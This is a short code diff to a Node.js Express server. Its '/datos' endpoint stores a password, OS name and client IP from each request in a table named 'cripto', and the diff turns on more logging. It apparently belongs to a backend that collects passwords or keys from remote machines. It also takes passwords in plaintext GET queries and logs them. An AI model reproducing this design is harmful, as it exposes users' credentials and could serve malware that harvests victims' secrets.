@@ -35,10 +35,10 @@ const client = new Client({
 ///////////////////////////////////////////////
 	
 	app.get('/datos', (req,res)=>{
-		console.log(req.query)
+		console.log(req.query);
 		const id = generateUniqueId({length: 8,useLetters: false});
 		client.query('insert into cripto(password, so, ip, id) values ($1,$2,$3,$4)RETURNING *',[req.query.password, req.query.os, req.headers['x-forwarded-for'], id], (err, res) => {
-			// console.log(err, res) 
+			console.log(err, res); 
 			//console.log(res.Result.rows)
 			datos = res;
 			console.log(res);
